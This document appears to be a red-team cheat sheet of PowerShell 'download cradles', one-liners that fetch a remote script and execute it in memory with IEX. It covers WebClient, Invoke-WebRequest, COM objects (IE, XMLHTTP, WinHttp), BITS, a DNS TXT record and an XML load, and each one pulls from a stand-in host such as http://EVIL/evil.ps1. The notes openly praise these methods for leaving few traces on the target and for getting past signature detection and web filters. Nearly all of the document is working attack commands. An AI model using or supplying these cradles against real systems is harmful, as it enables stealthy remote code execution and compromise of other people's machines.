These PowerShell "Download Cradles" allow you to fetch and execute code in memory, minimizing the traces left on the target's hard drive.

---

### 1. Standard Web Methods

>[!TIP]

**WebClient DownloadString**

`IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")`

- **Explanation:** Uses the `.NET WebClient` class to download a script as a string and passes it directly to `IEX` (Invoke-Expression) for execution.
    

>[!TIP]

**Invoke-WebRequest (PS 3.0+)**

`IEX (iwr 'http://EVIL/evil.ps1')`

- **Explanation:** Uses the built-in `iwr` (alias for `Invoke-WebRequest`) for a more concise one-liner.
    

---

### 2. COM Object Cradles

>[!INFO]

**Internet Explorer COM**

`$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r`

- **Explanation:** Spawns a hidden IE process to browse to the script, scrapes the HTML content, and executes it.
    

>[!INFO]

**Msxml2.XMLHTTP COM**

`$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText`

- **Explanation:** Uses an XMLHTTP object to perform a GET request. It is often used to bypass simple signature-based detection.
    

>[!INFO]

**WinHttp COM**

`$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText`

- **Explanation:** Similar to XMLHTTP but uses the WinHTTP stack. Note: This method is **not** proxy-aware.
    

---

### 3. File & Protocol Alternatives

>[!WARNING]

**BITS Transfer (Disk Intensive)**

`Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r`

- **Explanation:** Uses the Background Intelligent Transfer Service. It downloads the file to a temp location first, reads it, executes it, and then deletes it.
    

>[!IMPORTANT]

**DNS TXT Approach**

`IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))`

- **Explanation:** Queries a DNS TXT record for a Base64 encoded payload, decodes it in memory, and executes it. Great for bypassing web filters.
    

>[!IMPORTANT]

**XML Document Load**

`$a = New-Object System.Xml.XmlDocument; $a.Load("http://EVIL/payload.xml"); $a.command.a.execute | iex`

- **Explanation:** Loads a remote XML file and executes the content stored within a specific XML tag (in this case, `<execute>`).
    

---
